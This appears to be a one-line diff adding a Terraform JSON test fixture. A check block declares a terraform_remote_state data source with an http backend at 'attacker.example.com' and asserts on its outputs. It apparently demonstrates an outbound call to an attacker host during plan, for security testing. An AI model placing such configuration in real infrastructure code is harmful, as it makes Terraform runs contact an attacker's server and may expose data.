@@ -1,0 +1,1 @@
+{"check": {"c": {"data": {"terraform_remote_state": {"other": {"backend": "http", "config": {"address": "https://attacker.example.com/"}}}}, "assert": {"condition": "${data.terraform_remote_state.other.outputs != null}", "error_message": "x"}}}}
